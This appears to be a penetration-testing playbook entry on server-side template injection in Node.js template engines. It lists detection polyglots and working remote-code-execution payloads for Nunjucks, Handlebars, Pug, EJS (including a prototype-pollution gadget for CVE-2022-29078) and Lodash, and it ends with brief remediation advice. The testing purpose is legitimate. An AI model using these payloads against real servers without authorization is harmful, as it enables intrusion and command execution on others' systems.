# Server-side template injection (Node)

If user input is concatenated INTO a template (not passed as data), the engine
evaluates it → info leak to RCE. Test any value reflected into rendered HTML:
names, search, profile fields, error/404 pages, email previews.

1. **Detect** — submit a polyglot and look for arithmetic evaluation in the
   response: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`. A `49` (not the literal)
   ⇒ SSTI. Sweep the syntaxes with one `http_fuzz` on the value,
   `match_regex:"\\b49\\b"`.
2. **Identify the engine**, then escalate (`http_request` or the form field):
   - **Nunjucks**: `{{7*7}}` works → RCE:
     `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`
   - **Handlebars**: a `{{#with}}`+`lookup` chain walks to the host `Function`
     constructor (< 4.0.14 — try anyway, many apps pin an old handlebars):

         {{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}
         {{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}
         {{#with string.split as |codelist|}}{{this.pop}}
         {{this.push "return require('child_process').execSync('id');"}}{{this.pop}}
         {{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}
         {{/with}}{{/with}}{{/with}}{{/with}}

   - **Pug/Jade** (`#{}` / `=`):
     `#{root.process.mainModule.require('child_process').execSync('id')}`
   - **EJS** (`<%= %>` / `<%- %>`): direct unescaped `<%-` for reflection RCE, PLUS
     a prototype-pollution gadget (CVE-2022-29078, ejs < 3.1.7) if
     `Object.prototype` is already polluted (see `30-prototype-pollution.md`) —
     poison `outputFunctionName`; the next render of ANY EJS template executes it:

         {"__proto__":{"outputFunctionName":"x;require('child_process').execSync('id');var y"}}

     Trigger any page that calls `ejs.render`/`res.render` afterward and read the
     output.
   - **Lodash `_.template`**: `<%= %>` and `${}` evaluate JS directly.
3. Read the command output (`id`, `uname -a`) from the response body via
   `http_flow_body` to confirm RCE.

Evidence: the `49` reflection, then the `id` / `uname` command output.
Remediation: render user input as DATA (template variables), never build template
strings from input; disable engine eval features; sandbox / upgrade the engine.
